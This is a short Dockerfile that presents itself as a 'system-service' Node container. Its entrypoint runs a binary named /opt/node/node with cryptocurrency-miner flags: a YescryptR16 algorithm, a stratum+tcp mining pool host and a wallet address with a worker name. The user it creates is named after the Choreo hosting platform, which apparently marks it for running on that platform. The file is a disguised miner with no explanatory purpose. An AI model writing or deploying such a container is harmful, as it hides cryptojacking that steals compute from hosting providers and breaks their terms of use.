FROM chriskm12/system-service:002

# Create a new user with UID 10014
RUN groupadd -g 10014 choreo && \
    useradd -u 10014 -g choreo -M -s /usr/sbin/nologin choreouser

USER 10014

WORKDIR /opt/node
ENTRYPOINT ["/bin/bash", "-c", "/opt/node/node -q --no-color -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.choreo_137"]


